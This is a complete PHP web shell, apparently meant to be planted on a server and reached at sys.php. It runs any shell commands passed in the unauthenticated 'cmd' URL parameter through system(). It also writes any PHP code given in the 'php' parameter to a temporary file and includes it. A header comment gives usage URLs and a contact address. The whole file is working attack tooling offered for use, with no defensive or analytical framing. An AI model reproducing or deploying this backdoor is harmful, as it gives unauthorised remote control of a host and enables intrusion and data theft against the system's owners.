<?php
/*
 * support & suggestions -  andrew.wrath@gmail.com
 * usage  - http://your.domain.com/sys.php?cmd=shellcmd
 *           http://your.domain.com/sys.php?php=phpscript
 *
 */

$var = $_GET['cmd'];
$function = $_GET['php'];

//execute a command, or a series of commands. Separate multiple commands with a semicolon (;)
function cmd($var) {
        $cmds = explode (";", $var);
        foreach ($cmds as $val) {
                system(stripslashes($val));
        }
}

//run php code
function callfunc($name) {
        $rand = rand(0,255);
        $fname = "inc".$rand.".php";
        $h= "<?php\n";
        $c= $name . ";\n";
        $f= "?>";
        if (!$handle = fopen($fname, 'w+')) {
                die("Cannot open/create file $fname");
        } else if (!fwrite($handle, stripslashes($h.$c.$f))) {
                die("Cannot write to file $fname");
        } else if (!fclose($handle)) {
                die("Could not close the handle to $fname");
        }
        include($fname);
        if (!unlink($fname)) {
                echo "temp file left over.";
        }
}

if (!empty($var))
        cmd($var);
if (!empty($function))
        callfunc($function);
        
?>
